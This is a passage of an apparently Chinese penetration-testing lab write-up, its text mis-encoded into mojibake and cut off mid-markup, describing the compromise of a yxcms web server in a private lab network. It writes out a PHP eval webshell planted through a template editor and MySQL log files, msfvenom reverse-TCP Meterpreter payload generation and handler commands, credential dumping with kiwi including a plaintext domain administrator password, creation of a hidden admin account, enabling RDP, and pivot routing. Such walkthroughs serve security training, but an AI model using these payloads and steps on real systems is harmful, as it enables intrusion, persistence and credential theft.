2003)ï¼š192.168.52.141 ä¸»æœºåï¼šroot-tvi862ubeh</li><li>åŸŸæ§(Windows Server 2008)ï¼š192.168.52.138 ä¸»æœºåï¼šowa</li></ul><p>webæœåŠ¡å™¨æœ‰ä¸¤å—ç½‘å¡ï¼Œå…¶ä¸­192.168.74.128æ¨¡æ‹Ÿçš„æ˜¯å…¬ç½‘ç¯å¢ƒï¼Œæ”»å‡»è€…å¯ä»¥ç›´æ¥è®¿é—®ï¼Œ192.168.52.143å±äºå†…ç½‘ï¼Œæ”»å‡»è€…æ— æ³•ç›´æ¥è®¿é—®</p><h1 id="æ¸—é€è¿‡ç¨‹"><a href="#æ¸—é€è¿‡ç¨‹" class="headerlink" title="æ¸—é€è¿‡ç¨‹"></a>æ¸—é€è¿‡ç¨‹</h1><h2 id="ç½‘ç«™æ¢æµ‹"><a href="#ç½‘ç«™æ¢æµ‹" class="headerlink" title="ç½‘ç«™æ¢æµ‹"></a>ç½‘ç«™æ¢æµ‹</h2><p>é¦–å…ˆè®¿é—®ç½‘ç«™ä¸»é¡µ: <a href="http://192.168.74.129/yxcms">http://192.168.74.129/yxcms</a></p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511130446365.png" alt="image-20210511130446365" style="zoom:67%;"><p>å…ˆæ‰«æä¸€ä¸‹ç›®å½•</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511153857974.png" alt="image-20210511153857974" style="zoom:50%;"><p>å¯ä»¥çœ‹å­˜åœ¨å¾ˆå¤šå¯ä»¥è®¿é—®çš„ç›®å½•ï¼Œå¹¶ä¸”è¿™äº›ç›®å½•éƒ½å­˜åœ¨ç›®å½•éå†æ¼æ´ï¼Œå¦‚<code>/public</code>,å¯ä»¥çœ‹åˆ°è¯¥ç›®å½•ä¸‹çš„å¾ˆå¤šå†…å®¹ï¼Œä½†æ˜¯æ²¡æœ‰æƒ³è¦å†…å®¹</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511154129595.png" alt="image-20210511154129595" style="zoom:50%;"><h2 id="ç½‘ç«™æ¼æ´åˆ©ç”¨getshell"><a href="#ç½‘ç«™æ¼æ´åˆ©ç”¨getshell" class="headerlink" title="ç½‘ç«™æ¼æ´åˆ©ç”¨getshell"></a>ç½‘ç«™æ¼æ´åˆ©ç”¨getshell</h2><ul><li><p>ç»è¿‡æ¢æµ‹ç½‘ç«™çš„åå°ç™»å½•é¡µé¢æ˜¯<code>http://192.168.74.129/yxcms/index.php?r=admin/index/login</code></p><p>ç»è¿‡çˆ†ç ´å¾ˆå®¹æ˜“è¯•å‡ºå¯†ç ä¸º<code>123456</code></p><p>æˆåŠŸç™»å½•åå°</p></li></ul><ul><li><p>å°è¯•æœç´¢ç½‘ç«™å·²å‘ç°çš„æ¼æ´</p><p>è¿™æ˜¯ä¸€ä¸ªç½‘ç«™å¸¸ç”¨çš„CMSï¼Œåœ¨ç½‘ä¸Šæœç´¢ä¸€ä¸‹æ˜¯å¦å­˜åœ¨å¯ä»¥ç›´æ¥åˆ©ç”¨çš„æ¼æ´</p><p><a href="https://www.freebuf.com/column/162886.html">ä»£ç å®¡è®¡| yxcms app 1.4.6 æ¼æ´é›†åˆ</a></p><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªcmsè¿˜æ˜¯å­˜åœ¨å‡ ä¸ªå¾ˆå¥½åˆ©ç”¨çš„æ¼æ´çš„ï¼Œå°è¯•ä½¿ç”¨å…¶ä¸­æ–‡ä»¶å†™å…¥æ¼æ´</p><p>è®¿é—®<code>http://192.168.74.129/yxcms/index.php?r=admin/set/tpadd&amp;Mname=default</code>ï¼Œè¿™é‡Œå¯ä»¥å†™å…¥phpæ–‡ä»¶</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511155855512.png" alt="image-20210511155855512"></p></li></ul><p>å†™å…¥ä¸€å¥è¯æœ¨é©¬</p><p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210511155949294.png" alt="image-20210511155949294"></p><p>å†™å…¥æˆåŠŸåï¼Œè®¿é—®<code>http://192.168.74.129/yxcms/protected/apps/default/view/default/info.php</code>å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸå†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œä¹‹åå°±æ˜¯ç”¨èšå‰‘è¿æ¥</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511160216194.png" alt="image-20210511160216194" style="zoom:50%;"><p>æˆåŠŸè·å–shellï¼Œå¹¶ä¸”æ˜¯systemæƒé™ï¼Œè¿™æ˜¯ç”±äºè¯¥ç½‘ç«™ç®¡ç†å‘˜ç›´æ¥ä½¿ç”¨<code>administrator</code>ç™»å½•åŸŸæ§ä¸»æœºï¼Œè‹¥æ˜¯åœ¨çœŸæ˜¯ç¯å¢ƒä¸­è·å–çš„æ˜¯æ™®é€šç”¨æˆ·æƒé™åˆ™è¿˜éœ€è¦é…åˆææƒï¼Œè·å–systemæƒé™</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511160418538.png" alt="image-20210511160418538"></p><h2 id="ä½¿ç”¨phpMyAdmin-Getshell"><a href="#ä½¿ç”¨phpMyAdmin-Getshell" class="headerlink" title="ä½¿ç”¨phpMyAdmin Getshell"></a>ä½¿ç”¨phpMyAdmin Getshell</h2><p>æ‰«æ<code>http://192.168.74.129/</code></p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511160728113.png" alt="image-20210511160728113"></p><p>ç›´æ¥ä½¿ç”¨å·¥å…·çˆ†ç ´ï¼Œå¾ˆå®¹æ˜“å¾—åˆ°ï¼Œç”¨æˆ·åå’Œå¯†ç éƒ½ä¸º<code>root</code></p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511132208919.png" alt="image-20210511132208919" style="zoom:50%;"><p>ä¸€å¼€å§‹çš„æƒ³æ³•æ˜¯åˆ©ç”¨å†™<code>into outfile</code>å†™æœ¨é©¬getshellï¼Œä½†æ˜¯ç”±äºç½‘ç«™çš„<code>secure_file_priv</code>çš„å€¼ä¸ºNULLï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½åˆ©ç”¨å†™<code>into outfile</code>å†™æœ¨é©¬getshell</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511161606685.png" alt="image-20210511161606685" style="zoom:50%;"><p>ä½†æ˜¯è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼Œå°±æ˜¯å‘mysqlæ—¥å¿—ä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œå…·ä½“å¦‚ä¸‹:<a href="https://blog.csdn.net/qq_36119192/article/details/103461736#%E5%88%A9%E7%94%A8%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6Getshell">mysqlæ—¥å¿—æœ¨é©¬</a></p><p>æ‰§è¡Œä¸‹åˆ—å‘½ä»¤</p><pre><code class="hljs mysql">set global general_log&#x3D;on;                                     #å¼€å¯æ—¥å¿—set global general_log_file&#x3D;&#39;C:&#x2F;phpstudy&#x2F;www&#x2F;yxcms&#x2F;hack.php&#39;;  #è®¾ç½®æŒ‡å®šæ–‡ä»¶ä¸ºç½‘ç«™æ—¥å¿—å­˜æ”¾æ–‡ä»¶SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;                  #æ‰§è¡Œè¯¥è¯­å¥ï¼Œä¼šå°†è¯¥å‘½ä»¤å†™å…¥æ—¥å¿—æ–‡ä»¶</code></pre><p>æ‰§è¡Œå®Œå‘½ä»¤ï¼Œä¾¿å¯ä»¥åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹çœ‹åˆ°<code>hack.php</code></p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511162058801.png" alt="image-20210511162058801"></p><p>æµè§ˆå™¨è®¿é—®<code>http://192.168.74.129/yxcms/hack.php</code>ï¼Œä¸€å¥è¯æœ¨é©¬è®¿é—®æˆåŠŸ</p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210511162146968.png" alt="image-20210511162146968" style="zoom:50%;"><h1 id="åæ¸—é€æ”»å‡»"><a href="#åæ¸—é€æ”»å‡»" class="headerlink" title="åæ¸—é€æ”»å‡»"></a>åæ¸—é€æ”»å‡»</h1><p>åœ¨æ‹¿åˆ°äº†WebæœåŠ¡å™¨çš„æƒé™åï¼Œæˆ‘ä»¬å°±è¦å°½å¯èƒ½å¤šçš„æœé›†è¯¥æœåŠ¡å™¨çš„ä¿¡æ¯ï¼Œç„¶åæ­å»ºéš§é“é€šå¾€å†…ç½‘ã€‚</p><p>æ‰§è¡Œ<code>whoami</code> ,<code>ipconfig</code>,<code>net localgroup administrators</code>å‘½ä»¤æˆ‘ä»¬çŸ¥é“å½“å‰çš„ç”¨æˆ·èº«ä»½æ˜¯ <code>administrator</code> ï¼Œåœ¨ç®¡ç†å‘˜ç»„ä¸­ï¼Œå¹¶ä¸”å¤„åœ¨åŸŸ god ä¸­ã€‚è¯¥ä¸»æœºæœ‰ä¸¤å¼ ç½‘å¡ï¼Œåˆ†åˆ«æ˜¯ï¼š192.168.74.129ï¼Œ192.168.52.143</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511162608469.png" alt="image-20210511162608469" style="zoom: 67%;"><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511162902010.png" alt="image-20210511162902010"></p><h2 id="è·å–MSF-shell"><a href="#è·å–MSF-shell" class="headerlink" title="è·å–MSF shell"></a>è·å–MSF shell</h2><p>ä½¿ç”¨<code>msf</code>ç”Ÿæˆæœ¨é©¬</p><ul><li><p>kaliç»ˆç«¯è¾“å…¥<code>msfconsole</code>ï¼Œè¿›å…¥msf</p></li><li><p>é€‰æ‹©å¸¦reverseå’Œmeterpreter(å‘é€ç«¯æ¥å—ç«¯è¿æ¥)çš„payloadsè¿›è¡Œåå¼¹ç«¯å£</p><pre><code class="hljs awk">use windows<span class="hljs-regexp">/x64/m</span>eterpreter_reverse_tcp</code></pre><p>è¾“å…¥<code>show options</code>æŸ¥çœ‹æ–¹æ³•</p></li><li><p>æ–°å¼€ä¸€ä¸ªç»ˆç«¯è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œç”Ÿæˆæœ¨é©¬æ–‡ä»¶ï¼Œå¹¶åˆ©ç”¨èšå‰‘ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºä¸­</p></li></ul><pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> -p windows/x<span class="hljs-number">64</span>/meterpreter_reverse_tcp lhost=<span class="hljs-number">192.168.74.130</span> lport=<span class="hljs-number">4444</span> -f exe -o <span class="hljs-number">1</span>.exe</code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511163917527.png" alt="image-20210511163917527" style="zoom: 67%;"><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511164107563.png" alt="image-20210511164107563" style="zoom:67%;"><ul><li><p>å†æ¬¡è¾“å…¥msfconsole è¿›å…¥åº”ç”¨ï¼Œè¾“å…¥<code>use exploit/multi/handler</code>è¿›å…¥ç®¡ç†å·¥å…·ï¼Œè·å–shellæƒé™ï¼Œå‘½ä»¤å¦‚ä¸‹</p><pre><code class="hljs routeros">use exploit/multi/handler<span class="hljs-builtin-name">set</span> payload windows/x64/meterpreter_reverse_tcp<span class="hljs-builtin-name">set</span> lhost kali<span class="hljs-string">&#x27;s ip</span><span class="hljs-string">run</span></code></pre><p>å³å¯è·å–shell</p></li></ul><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511165317518.png" alt="image-20210511165317518" style="zoom:67%;"><h2 id="è·å–å¯†ç "><a href="#è·å–å¯†ç " class="headerlink" title="è·å–å¯†ç "></a>è·å–å¯†ç </h2><p>åœ¨<code>meterpreter</code>ä¸­è¿è¡Œ<code>run windows/gather/smart_hashdump</code>,ä½†æ˜¯å‡ºç°é”™è¯¯ï¼Œæç¤ºéœ€è¦systemè¿›ç¨‹æƒé™</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511182726579.png" alt="image-20210511182726579" style="zoom:67%;"><p>ä½¿ç”¨<code>migrate 388</code>å°†meterpreterè¿ç§»åˆ°64ä½çš„è¿›ç¨‹ï¼Œè€Œä¸”è¯¥è¿›ç¨‹ä¹Ÿéœ€è¦æ˜¯systemæƒé™è¿è¡Œçš„</p><p>å†ä½¿ç”¨<code>run windows/gather/smart_hashdump</code></p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511183026072.png" alt="image-20210511183026072" style="zoom:67%;"><p>æ¥ä¸‹æ¥æ˜¯ç ´è§£è¯¥å¯†ç </p><p><strong>åŠ è½½ kiwiæ¨¡å—</strong></p><pre><code class="hljs ebnf"><span class="hljs-attribute">load kiwi</span><span class="hljs-attribute">creds_all</span></code></pre><p>ç»“æœå¦‚ä¸‹</p><pre><code class="hljs armasm"><span class="hljs-symbol">meterpreter</span> &gt; creds_all[+] Running as SYSTEM[*] Retrieving all credentials<span class="hljs-symbol">msv</span> credentials===============<span class="hljs-symbol">Username</span>       Domain  LM                                NTLM                              SHA1--------       ------  --                                ----                              ----<span class="hljs-symbol">Administrator</span>  GOD     edea194d76c77d87840ac10a764c7362  <span class="hljs-number">8</span>a963371a63944419ec1adf687bb1be5  <span class="hljs-number">343</span>f44056ed02360aead5618dd42e4614b5f70cf<span class="hljs-symbol">STU1$</span>          GOD                                       cde51539f42c2854d74e82db1173dd8c  <span class="hljs-number">50950</span>d918317edf0ab95661a565c6ebf1151fe3b<span class="hljs-symbol">wdigest</span> credentials===================<span class="hljs-symbol">Username</span>       Domain  Password--------       ------  --------(null)         (null)  (null)<span class="hljs-symbol">Administrator</span>  GOD     hongrisec<span class="hljs-comment">@2019</span><span class="hljs-symbol">STU1$</span>          GOD     <span class="hljs-number">81</span> <span class="hljs-built_in">c2</span> <span class="hljs-number">84</span> <span class="hljs-number">7</span>c a6 <span class="hljs-number">0</span>f <span class="hljs-number">51</span> <span class="hljs-number">4</span>b <span class="hljs-number">41</span> <span class="hljs-number">91</span> b3 <span class="hljs-number">1</span>a <span class="hljs-number">0</span>d <span class="hljs-number">7</span>e <span class="hljs-number">56</span> <span class="hljs-number">32</span> <span class="hljs-number">0</span>e <span class="hljs-number">37</span> <span class="hljs-built_in">c7</span> <span class="hljs-number">77</span> <span class="hljs-built_in">f7</span> <span class="hljs-number">54</span> <span class="hljs-number">09</span> <span class="hljs-built_in">f4</span> <span class="hljs-built_in">f2</span> <span class="hljs-number">8</span>b <span class="hljs-number">54</span> cc <span class="hljs-number">6</span>b <span class="hljs-number">20</span> <span class="hljs-number">7</span>e <span class="hljs-number">9</span>c <span class="hljs-number">56</span> <span class="hljs-number">46</span> e5 ee <span class="hljs-built_in">d9</span> <span class="hljs-built_in">d2</span> <span class="hljs-number">84</span> aa <span class="hljs-number">6</span>a <span class="hljs-number">82</span> <span class="hljs-number">82</span> <span class="hljs-number">58</span> b1 ae bf <span class="hljs-number">47</span> db <span class="hljs-number">9</span>f <span class="hljs-number">53</span> <span class="hljs-number">9</span>e <span class="hljs-built_in">c9</span> <span class="hljs-built_in">a1</span> <span class="hljs-number">5</span>f bb ae <span class="hljs-built_in">a2</span> <span class="hljs-built_in">c3</span> <span class="hljs-number">7</span>f <span class="hljs-number">2</span>d <span class="hljs-number">37</span> <span class="hljs-number">9</span>d <span class="hljs-built_in">c1</span> <span class="hljs-number">9</span>a <span class="hljs-number">25</span> <span class="hljs-number">95</span> <span class="hljs-built_in">f6</span> <span class="hljs-number">49</span> b8 <span class="hljs-built_in">a2</span> <span class="hljs-built_in">f1</span> cb <span class="hljs-number">0</span>a ad <span class="hljs-built_in">f2</span> b2 <span class="hljs-number">27</span> <span class="hljs-built_in">c8</span> <span class="hljs-number">36</span> b2 eb a5 <span class="hljs-built_in">d9</span> <span class="hljs-number">3</span>c <span class="hljs-number">10</span> ca <span class="hljs-number">0</span>c <span class="hljs-number">38</span> <span class="hljs-number">18</span> <span class="hljs-number">63</span> fb <span class="hljs-number">0</span>d <span class="hljs-number">7</span>f <span class="hljs-number">67</span> ec <span class="hljs-number">37</span> <span class="hljs-number">87</span> <span class="hljs-number">84</span> e9 cc <span class="hljs-built_in">f3</span> <span class="hljs-built_in">d8</span> <span class="hljs-number">56</span> <span class="hljs-number">72</span> bc <span class="hljs-number">0</span>c cf e8 <span class="hljs-number">20</span> a7 <span class="hljs-number">93</span> <span class="hljs-number">07</span> <span class="hljs-number">29</span> <span class="hljs-number">3</span>d b5 <span class="hljs-number">48</span> b6 <span class="hljs-number">33</span> de e9 df <span class="hljs-number">3</span>a <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">94</span> a7 <span class="hljs-number">90</span> e6 <span class="hljs-built_in">d5</span> <span class="hljs-number">4</span>f ce a8 <span class="hljs-number">88</span> <span class="hljs-number">9</span>e a5 <span class="hljs-number">18</span> <span class="hljs-number">78</span> e4 <span class="hljs-number">43</span> e8 <span class="hljs-number">5</span>b e5 <span class="hljs-number">47</span> dc <span class="hljs-number">0</span>a <span class="hljs-number">34</span> be <span class="hljs-number">79</span> <span class="hljs-number">6</span>a fa fe <span class="hljs-number">7</span>f <span class="hljs-built_in">d5</span> <span class="hljs-built_in">c6</span> <span class="hljs-number">38</span> <span class="hljs-number">48</span> <span class="hljs-number">79</span> <span class="hljs-number">53</span> <span class="hljs-number">7</span>b <span class="hljs-number">3</span>f <span class="hljs-number">8</span>f <span class="hljs-number">9</span>e <span class="hljs-number">78</span> <span class="hljs-number">31</span> cf <span class="hljs-number">35</span> <span class="hljs-number">7</span>b <span class="hljs-number">12</span> <span class="hljs-number">93</span> e7 <span class="hljs-number">3</span>a <span class="hljs-built_in">f1</span> <span class="hljs-number">0</span>c de <span class="hljs-number">90</span> <span class="hljs-built_in">d9</span> e5 <span class="hljs-number">69</span> <span class="hljs-number">02</span> a9 ab <span class="hljs-built_in">c6</span> da <span class="hljs-built_in">f2</span> <span class="hljs-number">09</span> <span class="hljs-number">2</span>f <span class="hljs-number">8</span>a <span class="hljs-number">0</span>a ed <span class="hljs-number">19</span> <span class="hljs-number">44</span> <span class="hljs-number">11</span> <span class="hljs-built_in">c4</span> ba <span class="hljs-number">93</span> <span class="hljs-number">12</span> <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">69</span> <span class="hljs-number">3</span>a <span class="hljs-number">31</span> <span class="hljs-number">4</span>e ff b8 a7 <span class="hljs-number">72</span> da <span class="hljs-number">4</span>b <span class="hljs-number">6</span>e ad db e9 <span class="hljs-number">52</span> <span class="hljs-number">7</span>f <span class="hljs-number">88</span> cf <span class="hljs-number">0</span>f <span class="hljs-number">01</span> <span class="hljs-number">92</span> <span class="hljs-number">87</span> <span class="hljs-number">68</span> ba <span class="hljs-number">5</span>a <span class="hljs-built_in">d1</span> <span class="hljs-built_in">d3</span> ec <span class="hljs-number">1</span>f <span class="hljs-built_in">c3</span> b1 a5 <span class="hljs-number">3</span>b <span class="hljs-number">44</span> e5 <span class="hljs-number">7</span>b <span class="hljs-number">9</span>d <span class="hljs-number">2</span>f a9 <span class="hljs-number">28</span> <span class="hljs-number">5</span>b<span class="hljs-symbol">tspkg</span> credentials=================<span class="hljs-symbol">Username</span>       Domain  Password--------       ------  --------<span class="hljs-symbol">Administrator</span>  GOD     hongrisec<span class="hljs-comment">@2019</span><span class="hljs-symbol">kerberos</span> credentials====================<span class="hljs-symbol">Username</span>       Domain   Password--------       ------   --------(null)         (null)   (null)<span class="hljs-symbol">Administrator</span>  GOD.ORG  hongrisec<span class="hljs-comment">@2019</span><span class="hljs-symbol">stu1$</span>          GOD.ORG  <span class="hljs-number">81</span> <span class="hljs-built_in">c2</span> <span class="hljs-number">84</span> <span class="hljs-number">7</span>c a6 <span class="hljs-number">0</span>f <span class="hljs-number">51</span> <span class="hljs-number">4</span>b <span class="hljs-number">41</span> <span class="hljs-number">91</span> b3 <span class="hljs-number">1</span>a <span class="hljs-number">0</span>d <span class="hljs-number">7</span>e <span class="hljs-number">56</span> <span class="hljs-number">32</span> <span class="hljs-number">0</span>e <span class="hljs-number">37</span> <span class="hljs-built_in">c7</span> <span class="hljs-number">77</span> <span class="hljs-built_in">f7</span> <span class="hljs-number">54</span> <span class="hljs-number">09</span> <span class="hljs-built_in">f4</span> <span class="hljs-built_in">f2</span> <span class="hljs-number">8</span>b <span class="hljs-number">54</span> cc <span class="hljs-number">6</span>b <span class="hljs-number">20</span> <span class="hljs-number">7</span>e <span class="hljs-number">9</span>c <span class="hljs-number">56</span> <span class="hljs-number">46</span> e5 ee <span class="hljs-built_in">d9</span> <span class="hljs-built_in">d2</span> <span class="hljs-number">84</span> aa <span class="hljs-number">6</span>a <span class="hljs-number">82</span> <span class="hljs-number">82</span> <span class="hljs-number">58</span> b1 ae bf <span class="hljs-number">47</span> db <span class="hljs-number">9</span>f <span class="hljs-number">53</span> <span class="hljs-number">9</span>e <span class="hljs-built_in">c9</span> <span class="hljs-built_in">a1</span> <span class="hljs-number">5</span>f bb ae <span class="hljs-built_in">a2</span> <span class="hljs-built_in">c3</span> <span class="hljs-number">7</span>f <span class="hljs-number">2</span>d <span class="hljs-number">37</span> <span class="hljs-number">9</span>d <span class="hljs-built_in">c1</span> <span class="hljs-number">9</span>a <span class="hljs-number">25</span> <span class="hljs-number">95</span> <span class="hljs-built_in">f6</span> <span class="hljs-number">49</span> b8 <span class="hljs-built_in">a2</span> <span class="hljs-built_in">f1</span> cb <span class="hljs-number">0</span>a ad <span class="hljs-built_in">f2</span> b2 <span class="hljs-number">27</span> <span class="hljs-built_in">c8</span> <span class="hljs-number">36</span> b2 eb a5 <span class="hljs-built_in">d9</span> <span class="hljs-number">3</span>c <span class="hljs-number">10</span> ca <span class="hljs-number">0</span>c <span class="hljs-number">38</span> <span class="hljs-number">18</span> <span class="hljs-number">63</span> fb <span class="hljs-number">0</span>d <span class="hljs-number">7</span>f <span class="hljs-number">67</span> ec <span class="hljs-number">37</span> <span class="hljs-number">87</span> <span class="hljs-number">84</span> e9 cc <span class="hljs-built_in">f3</span> <span class="hljs-built_in">d8</span> <span class="hljs-number">56</span> <span class="hljs-number">72</span> bc <span class="hljs-number">0</span>c cf e8 <span class="hljs-number">20</span> a7 <span class="hljs-number">93</span> <span class="hljs-number">07</span> <span class="hljs-number">29</span> <span class="hljs-number">3</span>d b5 <span class="hljs-number">48</span> b6 <span class="hljs-number">33</span> de e9 df <span class="hljs-number">3</span>a <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">94</span> a7 <span class="hljs-number">90</span> e6 <span class="hljs-built_in">d5</span> <span class="hljs-number">4</span>f ce a8 <span class="hljs-number">88</span> <span class="hljs-number">9</span>e a5 <span class="hljs-number">18</span> <span class="hljs-number">78</span> e4 <span class="hljs-number">43</span> e8 <span class="hljs-number">5</span>b e5 <span class="hljs-number">47</span> dc <span class="hljs-number">0</span>a <span class="hljs-number">34</span> be <span class="hljs-number">79</span> <span class="hljs-number">6</span>a fa fe <span class="hljs-number">7</span>f <span class="hljs-built_in">d5</span> <span class="hljs-built_in">c6</span> <span class="hljs-number">38</span> <span class="hljs-number">48</span> <span class="hljs-number">79</span> <span class="hljs-number">53</span> <span class="hljs-number">7</span>b <span class="hljs-number">3</span>f <span class="hljs-number">8</span>f <span class="hljs-number">9</span>e <span class="hljs-number">78</span> <span class="hljs-number">31</span> cf <span class="hljs-number">35</span> <span class="hljs-number">7</span>b <span class="hljs-number">12</span> <span class="hljs-number">93</span> e7 <span class="hljs-number">3</span>a <span class="hljs-built_in">f1</span> <span class="hljs-number">0</span>c de <span class="hljs-number">90</span> <span class="hljs-built_in">d9</span> e5 <span class="hljs-number">69</span> <span class="hljs-number">02</span> a9 ab <span class="hljs-built_in">c6</span> da <span class="hljs-built_in">f2</span> <span class="hljs-number">09</span> <span class="hljs-number">2</span>f <span class="hljs-number">8</span>a <span class="hljs-number">0</span>a ed <span class="hljs-number">19</span> <span class="hljs-number">44</span> <span class="hljs-number">11</span> <span class="hljs-built_in">c4</span> ba <span class="hljs-number">93</span> <span class="hljs-number">12</span> <span class="hljs-number">73</span> <span class="hljs-number">04</span> <span class="hljs-number">69</span> <span class="hljs-number">3</span>a <span class="hljs-number">31</span> <span class="hljs-number">4</span>e ff b8 a7 <span class="hljs-number">72</span> da <span class="hljs-number">4</span>b <span class="hljs-number">6</span>e ad db e9 <span class="hljs-number">52</span> <span class="hljs-number">7</span>f <span class="hljs-number">88</span> cf <span class="hljs-number">0</span>f <span class="hljs-number">01</span> <span class="hljs-number">92</span> <span class="hljs-number">87</span> <span class="hljs-number">68</span> ba <span class="hljs-number">5</span>a <span class="hljs-built_in">d1</span> <span class="hljs-built_in">d3</span> ec <span class="hljs-number">1</span>f <span class="hljs-built_in">c3</span> b1 a5 <span class="hljs-number">3</span>b <span class="hljs-number">44</span> e5 <span class="hljs-number">7</span>b <span class="hljs-number">9</span>d <span class="hljs-number">2</span>f a9 <span class="hljs-number">28</span> <span class="hljs-number">5</span>b</code></pre><p>å¯ä»¥çœ‹åˆ°å¯†ç å·²ç»è¢«ç ´è§£å¤„ç†</p><pre><code class="hljs angelscript">passwordï¼š<span class="hljs-symbol">hongrisec@</span><span class="hljs-number">2019</span></code></pre><h2 id="è¿œç¨‹æ¡Œé¢ç™»å½•"><a href="#è¿œç¨‹æ¡Œé¢ç™»å½•" class="headerlink" title="è¿œç¨‹æ¡Œé¢ç™»å½•"></a>è¿œç¨‹æ¡Œé¢ç™»å½•</h2><p>å·²ç»è·å¾—äº†administratorçš„è´¦å·å’Œå¯†ç ï¼Œç°åœ¨æˆ‘ä»¬æ—¢å¯ä»¥ä½¿ç”¨administratorè´¦å·ç™»å½•ï¼Œä¹Ÿå¯ä»¥æ–°å»ºè´¦å·ç™»å½•ã€‚</p><p>ç›´æ¥ä½¿ç”¨administratorç™»å½•çš„è¯å¯èƒ½è¢«ç®¡ç†å‘˜å‘ç°ï¼Œæ‰€ä»¥ä½¿ç”¨ç¬¬äºŒç§æ–¹æ³•</p><pre><code class="hljs pgsql">net <span class="hljs-keyword">user</span> hack <span class="hljs-keyword">password</span>  /<span class="hljs-keyword">add</span>net localgroup administrators hack /<span class="hljs-keyword">add</span></code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511183802017.png" alt="image-20210511183802017" style="zoom: 80%;"><p>æŸ¥çœ‹ä¸»æœºæ˜¯å¦å¼€å¯<code>3389</code>ç«¯å£</p><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p <span class="hljs-number">3389</span> -v <span class="hljs-number">192.168.74.129</span></code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511184005186.png" alt="image-20210511184005186"></p><p>å¯ä»¥å‘ç°æ˜¯å…³é—­çš„ã€‚</p><p>ä½¿ç”¨meterpreter,æ‰“å¼€è¯¥ç«¯å£(è¿è¡Œä¹‹å‰å¥½åƒéœ€è¦é‡æ–°å¼¹å‡ºshell,ç›´æ¥è¿è¡Œæ²¡æœ‰æˆåŠŸ)</p><pre><code class="hljs awk">run post<span class="hljs-regexp">/windows/m</span>anage/enable_rdp</code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511184531850.png" alt="image-20210511184531850"></p><p>å†æ¬¡æ‰«æå°±ä¼šå‘ç°3389ç«¯å£å·²ç»æ‰“å¼€</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511184630200.png" alt="image-20210511184630200" style="zoom:67%;"><p>ç›´æ¥è¿æ¥å³å¯</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210511185014529.png" alt="image-20210511185014529" style="zoom:50%;"><h2 id="æ·»åŠ è·¯ç”±ã€æŒ‚Socks4aä»£ç†"><a href="#æ·»åŠ è·¯ç”±ã€æŒ‚Socks4aä»£ç†" class="headerlink" title="æ·»åŠ è·¯ç”±ã€æŒ‚Socks4aä»£ç†"></a>æ·»åŠ è·¯ç”±ã€æŒ‚Socks4aä»£ç†</h2><ul><li><p>æ·»åŠ è·¯ç”±çš„ç›®çš„æ˜¯ä¸ºäº†è®©æˆ‘ä»¬çš„MSFå…¶ä»–æ¨¡å—èƒ½è®¿é—®å†…ç½‘çš„å…¶ä»–ä¸»æœº</p></li><li><p>æ·»åŠ socks4aä»£ç†çš„ç›®çš„æ˜¯ä¸ºäº†è®©å…¶ä»–è½¯ä»¶æ›´æ–¹ä¾¿çš„è®¿é—®åˆ°å†…ç½‘çš„å…¶ä»–ä¸»æœºçš„æœåŠ¡</p></li></ul><p>æ³¨ï¼šæ·»åŠ è·¯ç”±ä¸€å®šè¦åœ¨æŒ‚ä»£ç†ä¹‹å‰ï¼Œå› ä¸ºä»£ç†éœ€è¦ç”¨åˆ°è·¯ç”±åŠŸèƒ½</p><p>åœ¨è·å–<code>shell</code>çš„æœºå™¨ä¸Šæ·»åŠ è·¯ç”±</p><pre><code class="hljs routeros">meterpreter &gt; <span class="hljs-builtin-name">run</span> get_local_subnetsmeterpreter &gt; <span class="hljs-builtin-name">run</span> autoroute -s 192.168.21.0/24<span class="hljs-comment"># æ·»åŠ è·¯ç”±</span>meterpreter &gt; <span class="hljs-builtin-name">run</span> autoroute -p<span 